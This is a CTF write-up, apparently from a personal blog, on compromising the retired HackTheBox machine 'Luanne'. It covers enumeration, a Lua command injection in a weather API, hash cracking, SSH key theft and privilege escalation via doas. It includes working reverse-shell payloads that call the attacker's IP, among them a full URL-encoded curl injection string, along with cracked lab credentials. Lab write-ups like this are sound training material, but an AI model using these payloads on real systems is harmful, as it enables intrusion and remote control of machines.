---
title: "Luanne HTB Writeup"
date: 2021-03-27T09:20:04+02:00
draft: false
Tags: [
    "Writeups",
    "hackthebox",
    "retired",
    "easy",
    "FreeBSD",
]
---
![Machine Info](/images/luanne/1.png)

Luanne is an easy machine retired today ..
let's check it out.. enjoy...
## Methodology:
* Recon / Scanning Target
* Searching for Vulnerabilities - also understanding the target
* Gaining Access / Foothold 
* Maintaining Access
* Privilege escalation
* Reporting - (don't forget taking notes after each step)
---
# []()Enumeration:
  using nmap scan to see the open ports and the running services
* **nmap -sC -sV -oN 10.10.10.218**

```bash
Nmap scan report for **luanne.htb** (10.10.10.218)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
```
There's a web server running on port 80:
![](/images/luanne/3.png)
* tried some default passwords, but didn't authorized access.
![](/images/luanne/4.png)
* also the nginx default page.
![](/images/luanne/5.png)

* **port 9001:**
![](/images/luanne/6.png)

* we noticed earlier a hostname (luanne.htb) .. we need to add it to our /etc/hosts file so we could access it.
![10.10.10.218	luanne.htb](/images/luanne/7.png)

* untill now nothing intersting showed up .. let's enumerate hidden directories:
* using Dirsearch:
```yml
python3 /home/sehs/dirsearch/dirsearch.py -u http://luanne.htb/ -e txt,html,php,log,zip,bac,bak,tar
```
![](/images/luanne/8.png)

found robots.txt file > this file tells the crawlers not to consider the paths inside it.. 
![found this /weather](/images/luanne/9.png)

so now let's see what's over there..
![](/images/luanne/10.png)

i also ran dirsearch again on the luanne.htb/weather >> but got nothing.
then i tried to search with the CVEs about nginx with version 1.9.0 and openssh but nothing usefull. so i turned back to enumeration.

This time using a bigger wordlist and gobuster.
### Gobuster:
* gobuster dir -u http://luanne.htb/weather -w /usr/share/dirb/wordlists/big.txt
![](/images/luanne/11.png)
![found this /forecast path](/images/luanne/12.png)
we could have used dirsearch too, but gobuster is faster in this case with bigger wordlists.

### Time for Web Enumeration:
* going to /weather/forecast:
![](/images/luanne/13.png)
* it says go to city=list >> so let's see /weather/forecast?city=list
![](/images/luanne/14.png)
![nothing really usefull. ](/images/luanne/15.png)

when tried single quote`` ' `` in the query, we got a lua error .. so now we knew that the backend language is lua.
![Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value](/images/luanne/16.png)
* now we have to fix the query so we could try command injection
* after some tries this >> ``')--`` makes the query right (-- to comment in lua)
* so now if we made a command within it ``')os.execute('command')--`` > it works
---
## Gaining Access:
* of course it's time to put regular reverse shell payload ``os.execute('nc 10.10.x.x PORT -e /bin/bash')`` and open our netcat .. but it didn't work..
it's time for searching around:
* if you noticed earlier from nmap (the os is NetBSD) so maybe we should try netbsd reverse shell [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)
![netbsd payload](/images/luanne/18.png)
![](/images/luanne/17.png)
* now we need to combine both of those to make our payload
```java
');'os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.15 9001 >/tmp/f")'
```
and let's encode the payload
![](/images/luanne/19.png)
* note: [i got errors and the problem was in the () > their encoding %28 %29 ]
now let's do it again and the whole thing will be:
```
curl luanne.htb/weather/forecast?city=Leeds%27%29%3Bos.execute%28%22rm%2520%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.15%209001%20%3E%2Ftmp%2Ff%22%29--
```
![](/images/luanne/20.png)
![horay! we got our shell](/images/luanne/21.png)

* let's list what in there >> and we found some credential / hash
![](/images/luanne/22.png)

### Cracking the hash using john:
* put the hash inside file and run john on it using rockyou.txt wordlist
![](/images/luanne/23.png)
The creds >> **``webapi_user:iamthebest``** .. or type ``$john --show hash``
* now lets login with these creds:
![](/images/luanne/24.png)
![](/images/luanne/25.png)
nothing useful in there...
let's keep digging:
``netstat -ant`` to check network connections
![](/images/luanne/26.png)
``nc 127.0.0.1 3001`` to listen on the server
![](/images/luanne/27.png)
lets try curl: 
![also unauthorized](/images/luanne/28.png)
so lets try using our creds >>
``curl --user :iamthebest  http://127.0.0.1:3001``
![](/images/luanne/29.png)
* it worked fine .. now thinking of using this
![we 've got one user on the system called r.michaels](/images/luanne/30.png)
![trying to get ssh keys from .ssh/id_rsa](/images/luanne/31.png)
![trying to get user.txt](/images/luanne/32.png)
![and finally getting ssh keys from michaels home](/images/luanne/33.png)
* copy and save them to a file and ``chmod 400 id_rsa``
* ``ssh -i id_rsa r.michaels@luanne.htb``
![](/images/luanne/34.png)
---
## Privilege Escalation / Rooting:
![](/images/luanne/35.png)
from the first sight >> this backed up file ``devel_backup-2020-09-16.tar.gz.enc`` is catchy
* i took some time to crack its encoding .. then i thought of roaming around maybe it's not the solution .. i used LinPEAS.sh to search around
.. then i came back to it .. so i'll short it down for u and be straight forward in this ...
* you can transfer the file on your machine to work on it like this:
```ruby
On your server (A):
nc -l -p 1234 -q 1 > something.zip < /dev/null

On your "sender client" (B):
cat something.zip | nc server.ip.here 1234
```
* found these files and their extention so i thought they are related and searched on 'em:
![](/images/luanne/36.png)
![](/images/luanne/37.png)
![](/images/luanne/38.png)
* as u can see it seems that our backup file was encrypted using this 'netpgp' tool .. earlier i tried decompressing using openssl but it needed password.
* ``which netpgp`` >> gives its location '/usr/bin/netpgp' >> so we could use it to crack our file.
![](/images/luanne/39.png)
* Decryption:
```yml
/usr/bin/netpgp --decrypt filename --output=/path

/usr/bin/netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/backup.tar.gz
```
![](/images/luanne/40.png)
* the file is being deleted so fast >> u 've to send it to your machine:
![](/images/luanne/41.png)
![](/images/luanne/42.png)
* To uncompress it >> ``tar xvzf backup.tar.gz`` 
* found a hash inside .htpasswd
![](/images/luanne/43.png)
* put the hash inside file to crack it with john
![](/images/luanne/44.png)
* cracking with john as before:
![](/images/luanne/45.png)
### creds: webapi_user:littlebear
* let's try switching into root and use the pass we got:
* when trying ``su root`` we got some error:
![](/images/luanne/46.png)
* after searching >> there is no su command in NetBsd systems, insteed its ``doas``
* you can check their [manual](https://man.netbsd.org/netpgb.1)
![](/images/luanne/47.png)
![](/images/luanne/48.png)
**rooted#**
* i hope you enjoyed..
* if so kindly give me respect [Wh1rlw1nd-HTB](https://www.hackthebox.eu/home/users/profile/182588)
* feel free to contact me for feedbacks or any help...



